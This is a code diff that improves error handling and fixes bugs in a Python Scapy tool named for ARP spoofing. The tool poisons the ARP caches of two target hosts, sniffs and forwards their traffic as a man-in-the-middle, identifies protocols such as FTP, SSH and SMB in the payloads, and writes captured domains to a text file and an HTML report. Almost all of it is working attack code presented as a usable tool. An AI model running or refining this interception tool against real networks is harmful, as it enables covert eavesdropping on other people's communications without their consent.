@@ -23,24 +23,32 @@ def arpSpoof(target, spoofIp, iface):
         time.sleep(1)
 
 def forwardPacket(pkt, target1, target2, iface):
-     if pkt.haslayer(IP):
+    if pkt.haslayer(IP):
         sendp(pkt, iface=iface, verbose=False)
 
 def sniffAndForward(target1, target2, iface):
     print(f"Starting packet sniffing on {iface}")
-    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, target1, target2, iface), store=0, timeout=None)
+    try:
+        sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, target1, target2, iface), store=0, timeout=None)
+    except PermissionError:
+        print("Error: Insufficient permissions for sniffing. Run with sudo.")
+        sys.exit(1)
+    except Exception as e:
+        print(f"Error during sniffing: {e}")
+        sys.exit(1)
 
 def startAttack(target1, target2, iface, report):
     # Start ARP poisoning threads
     threading.Thread(target=arpSpoof, args=(target1, target2, iface), daemon=True).start()
     threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()
-    # Start sniffing and forwarding packets
+    # Start sniffing and forwarding packets or generating report
     if report == 1:
         createReport(target1, target2, iface)
     else:
         sniffAndForward(target1, target2, iface)
 
 def createReport(target1, target2, iface):
+    global reportSig
     applicationPorts = {
         21: "FTP", 22: "SSH", 23: "Telnet",
         25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
@@ -49,11 +57,7 @@ def createReport(target1, target2, iface):
         3306: "MySQL", 5432: "PostgreSQL"
     }
 
-    reportSig == True
-
-    # Data aggregation structures
-    protocolCount = {}
-    domainSet = set()
+    reportSig = True  # Corrected assignment
     txtFilename = "sniffingData.txt"
     
     # Create or clear the txt file and write initial data
@@ -110,7 +114,7 @@ def createReport(target1, target2, iface):
                 protocols.append("SNMP")
             if "dhcp" in payload or "discover" in payload:
                 protocols.append("DHCP")
-            # Additional protocol checks:
+            # Additional protocol checks
             if "smb" in payload:
                 protocols.append("SMB")
             if "rdp" in payload:
@@ -119,7 +123,10 @@ def createReport(target1, target2, iface):
                 protocols.append("SIP")
  
         return protocols
-     
+
+    # Data aggregation structure for domains
+    domainSet = set()
+
     def packetCallback(packet):
         # Only process packets exchanged between target1 and target2
         if packet.haslayer(IP):
@@ -145,6 +152,13 @@ def createReport(target1, target2, iface):
         sniff(iface=iface, filter="ip", prn=packetCallback, store=False, timeout=None)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
+        generateHtmlReport(txtFilename)  # Generate report immediately after interrupt
+    except PermissionError:
+        print("Error: Insufficient permissions for sniffing. Run with sudo.")
+        sys.exit(1)
+    except Exception as e:
+        print(f"Error during sniffing: {e}")
+        sys.exit(1)
 
 def generateHtmlReport(txtFilename):
     # Initialize report variables
@@ -153,27 +167,34 @@ def generateHtmlReport(txtFilename):
     domainSet = set()
 
     # Read the content of the txt file to extract information
-    with open(txtFilename, "r") as txt_file:
-        lines = txt_file.readlines()
+    try:
+        with open(txtFilename, "r") as txt_file:
+            lines = txt_file.readlines()
+            if len(lines) <= 1:  # Only header, no data
+                print("No data captured to generate a report.")
+                return
 
-        # Extract basic information
-        for line in lines[1:]:  # Skip the header
-            columns = line.strip().split(',')
-            if len(columns) < 6:
-                continue  # In case the line is malformed
-            
-            # Extract data
-            target1 = columns[0]
-            target2 = columns[1]
-            iface = columns[2]
-            protocols = columns[3].split(", ")
-            summary = columns[4]
-            domains = columns[5]
-            
-            # Update protocol counts
-            for proto in protocols:
-                protocolCount[proto] = protocolCount.get(proto, 0) + 1
-            domainSet.update(domains.split(", "))  # Add found domains
+            # Extract basic information
+            for line in lines[1:]:  # Skip the header
+                columns = line.strip().split(',')
+                if len(columns) < 6:
+                    continue  # Skip malformed lines
+                
+                # Extract data
+                target1 = columns[0]
+                target2 = columns[1]
+                iface = columns[2]
+                protocols = columns[3].split(", ")
+                domains = columns[5]
+                
+                # Update protocol counts
+                for proto in protocols:
+                    protocolCount[proto] = protocolCount.get(proto, 0) + 1
+                if domains != "No domains detected":
+                    domainSet.update(domains.split(", "))
+    except FileNotFoundError:
+        print(f"Error: {txtFilename} not found. No report generated.")
+        return
 
     # Build the HTML report
     htmlContent = """<!DOCTYPE html>
@@ -218,17 +239,21 @@ def generateHtmlReport(txtFilename):
 
     htmlContent += """      </ul>
     </div>
-    <p>Raw sniffing data has been saved in <strong>{csvFilename}</strong></p>
+    <p>Raw sniffing data has been saved in <strong>{txtFilename}</strong></p>
   </div>
 </body>
 </html>
-""".format(csvFilename=txtFilename)
+""".format(txtFilename=txtFilename)
 
     # Write the HTML content to a file
-    with open("report.html", "w") as html_file:
-        html_file.write(htmlContent)
-    print("HTML report generated: report.html")
-
+    try:
+        with open("report.html", "w") as html_file:
+            html_file.write(htmlContent)
+        print("HTML report generated: report.html")
+    except PermissionError:
+        print("Error: Insufficient permissions to write report.html.")
+    except Exception as e:
+        print(f"Error writing HTML report: {e}")
 
 def menu():
     RED = "\033[38;2;255;0;0m"
@@ -240,12 +265,13 @@ def menu():
         report = input("Want to create a report during the attack? [Y]es | [N]o: ")
         if report.lower() == "y":
             startAttack(target1, target2, interface, 1)
+            break
         elif report.lower() == "n":
             startAttack(target1, target2, interface, 0)
             break
         else:
-            print("Invalid.")
-            
+            print("Invalid input. Please enter 'Y' or 'N'.")
+
 def terminal():
     parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument("-t1", "--target1", required=True, help="Target 1 IP address.")
@@ -267,12 +293,12 @@ def signalHandler(sig, frame):
     global running
     print("\nGracefully stopping attack...")
     running = False
-    if reportSig == True:
+    if reportSig:
         generateHtmlReport("sniffingData.txt")
     sys.exit(0)
 
 def main():
-    signal.signal(signal.SIGINT, signalHandler)  
+    signal.signal(signal.SIGINT, signalHandler)
     if len(sys.argv) > 1:
         terminal()
     else:
